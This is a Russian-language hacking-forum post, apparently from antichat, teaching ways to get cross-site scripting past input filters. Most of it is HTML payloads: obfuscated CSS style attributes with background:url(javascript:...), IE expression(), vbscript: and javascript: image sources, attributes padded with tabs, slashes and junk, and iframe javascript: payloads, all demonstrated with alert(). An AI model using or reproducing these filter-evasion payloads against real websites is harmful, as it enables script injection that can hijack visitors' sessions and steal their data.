https://forum.antichat.ru//threads/11807/
В одной из моих статей, Я с вами рассматривал разновидные варианты обхода фильтров в параметрах атрибута style.

Напомним себе материал той статьи, так как этот материал нам еще пригодится.

HTML:

<html><body><a href=www. style="back\g\r\o\u\nd:\u\r\l\(\javasc\r\i\p\t\:a\le\r\t\(\'\w\j\'\)\)" >wj<a></body></html>

HTML:

<html><body><a href=www. style="/**/back\g\r\o\u\nd/**/:/**/\u/**/\r/**/\l/**/\(/**/\j/**/a/**/v/**/a/**/s/**/c/**/\r/**/\i\p/**/\t\:/**/a/**/\l/**/e/**/\r/**/\t/**/\(/**/\/**/'\w\j\'/**/\/**/)/**/\/**/)" >wj<a></body></html>

HTML:

<html><body><a href=www. style="/**/back\g\r\o\u\nd/**/:/**/\u/**/\r/**/\l/**/\(/**/\j/**/a/**/v/**/a/**/s/**/c/**/\r/**/\i\p/**/\t\:/**/a/**/\l/**/e/**/\r/**/\t/**/\(/**/\/**//\w\j\//**/\/**/)/**/\/**/)" >wj<a></body></html>

HTML:

<html><body><a href=www. style=/**/back\g\r\o\u\nd/**/:/**/\u/**/\r/**/\l/**/\(/**/\j/**/a/**/v/**/a/**/s/**/c/**/\r/**/\i\p/**/\t\:/**/a/**/\l/**/e/**/\r/**/\t/**/\(/**/\/**//\w\j\//**/\/**/)/**/\/**/) >wj<a></body></html>

HTML:

<html><body><a href=www. style=&#61&#61&#61/&#61*&#61*&#61/&#61back\g\r\o\u\nd&#61/&#61*&#61*&#61/&#61:&#61/*&#61*/\u/*&#61*/\r/*&#61*/l/*&#61*/\(/*&#61*/\j/*&#61*/a/*&#61*/v/*&#61*/a/*&#61*/s/*&#61*/c/*&#61*/\r/*&#61*/\i\p/*&#61*/\t\:/*&#61*/a/*&#61*/\l/*&#61*/e/*&#61*/\r/*&#61*/\t/*&#61*/\(/*&#61*&#61/&#61\&#61/&#61*&#61*//\w\j\//**/\/**/)/**/\/**/) >wj<a></body></html>

HTML:

<html><body><a href=www. style=&#61&#61&#61/&#61*&#61*&#61/&#61back\g\r\o\u\nd&#61/&#61*&#61*&#61/&#61:&#61/*&#61*/\u/*&#61*/\r/*&#61*/l/*&#61*/\(/*&#61*/\j/*&#61*/a/*&#61*/v/*&#61*/a/*&#61*/s/*&#61*/c/*&#61*/\r/*&#61*/\i\p/*&#61*/\t\:/*&#61*/a/*&#61*/\l/*&#61*/e/*&#61*/\r/*&#61*/\t/*&#61*/\(/*&#61*&#61/&#61\&#61/&#61*&#61*/'\w\j\'/*&#61*&#61/&#61\&#61/&#61*&#61*/)/*&#61*&#61/&#61\&#61/&#61*&#61*/) >wj<a></body></html>

До атрибута style, можно поставить иМхо, что угодно...

Будет работать и так,

HTML:

<html><body>
<WhiteJordan/style=background:url(javascript:alert(/wj/))>
</body></html>

И да, даже вот так,

HTML:

<html><body>
<WhiteJordan/**/style=background:url(javascript:alert(/wj/))>
</body></html>

Да блин и вот так!

HTML:

<html><body>
<WhiteJordan/*/style=background:url(javascript:alert(/wj/))>
</body></html>

Да [мат]! Так ТОЖЕ будет работать [мат]!

HTML:

<html><body>
<White Jordan/*/style=background:url(javascript:alert(/wj/))>
</body></html>

Но проблема иногда бываем из-за того, что сам атрибут, "style", иногда просто фильтруется, а иногда к нему прибавляется ещё и крестик какой нить, (X) в этом случаи, это можно обойти вот так,

HTML:

<html><body>
<WhiteJordan/StYlE                =background:url(javascript:alert(/wj/))>
</body></html>

Где буквы S, Y и E, написаны большими буквами, а после большой буковки E, до знака равенства, (=) идут обычные пробелы.

И естественно сами пробелы, можно тоже заменить ещё и табуляциями....примерно вот так,

HTML:

<html><body>
<WhiteJordan/StYlE			=background:url(javascript:alert(/wj/))>
</body></html>

Тоже самое, можно употребить и для тега <img src=...>,

HTML:

<html><body>
<img/src	=javascript:alert(/wj/)>
</body></html>

Или

HTML:

<html><body>
<img		src	=javascript:alert(/wj/)>
</body></html>

и

HTML:

<html><body>
<img	/	src	=javascript:alert(/wj/)>
</body></html>

Тут использовались табуляции ( ), в совокупности со слешом. (/)

Должен ещё добавить, что в середине атрибутов тега можно вписывать - что угодно...к примеру:

HTML:

<html><body>
<img	White Jordan	src	=javascript:alert(/wj/)>
</body></html>

Или вообще это все написать вот так,

HTML:

<html><body>
<img/WhiteJordan/src=javascript:alert(/wj/)>
</body></html>

Атрибут img, можно и не сокращать:

HTML:

<html><body>
<image/White/Jordan/src=javascript:alert(/wj/)>
</body></html>

Чуток познакомлю всех с материалом на разброс, на всякий пожарный если кто не знал или ещё что-нить такое..

В языке VbScript, в скобках, можно ТОЛЬКО вставить двойные кавычки, что-бы получить видное для глаз сообщение в коробке алёрта.

То есть вот так,


HTML:

<html><body>
<img src=vbscript:alert(/wj/)>
</body></html>

Или так,

HTML:

<html><body>
<img src=vbscript:alert(`wj`)>
</body></html>

Или вот так,

HTML:

<html><body>
<img src=vbscript:alert('wj')>
</body></html>

Работать у вас не хера не будет.


Будет работать только вот так:


HTML:

<html><body>
<img src=vbscript:alert("wj")>
</body></html>

В двух словах, если вы хотите в параметре (внутренности) атрибута тега использовать VbScript, а сам параметр заключить в кавычки, то для работоспособности вы должны будите написать вот так:

HTML:

<html><body>
<img src='vbscript:alert("wj")'>
</body></html>

Или же так.

HTML:

<html><body>
<img src=`vbscript:alert("wj")`>
</body></html>

Вот так у вас,

HTML:

<html><body>
<img src="vbscript:alert("wj")">
</body></html>

Работать не будет.

До функции "expression", можно вставить - что угодно. Хоть так, ИЕ по барану:

HTML:

<html><body>
<span style="WhiteJordan:expression(eval(window.alert(/wj/)))">wj</span>
</body></html>

Функцию "eval" писать тоже не обязательно, а функцию, "window.alert", можно сократить до "alert":

HTML:

<html><body>
<span style="WhiteJordan:expression(alert(/wj/))">wj</span>
</body></html>

Или же так, создать свой собственный атрибут и назвать его, "span2", после чего его параметр будет обрабатываться JavaScript`ом.

HTML:

<html><body>
<span style="WhiteJordan:expression(javascript(eval(span2)));"  span2='alert(/wj2/);span2=null;'></span></body></html>

Можно конечно и так,

HTML:

<html><body>
<span style='background:url(javascript:eval(window.alert("wj")))'>
</body></html>


Чуток покажу вам браузеро не зависимые коды, то есть коды, которые работает во всех браузерах.

HTML:

<html><body>
<iframe src="javascript:eval(this.wj); wj=this.wj='<scrip\x74>aler\x74(/wj/);</scrip\x74>'">
</body></html>

HTML:

<html><body>
<iframe src="javascript:eval(this.wj); wj=this.wj='<script>alert(/wj/);</script>'">
</body></html>


HTML:

<html><body><iframe src=javascript:alert(/wj/) style='display:none;'></body></html>

HTML:

<html><body>
<iframe src='javascript:eval(this.wj1); wj1=alert(/wj2/);' style='display:none'>
</body></html>

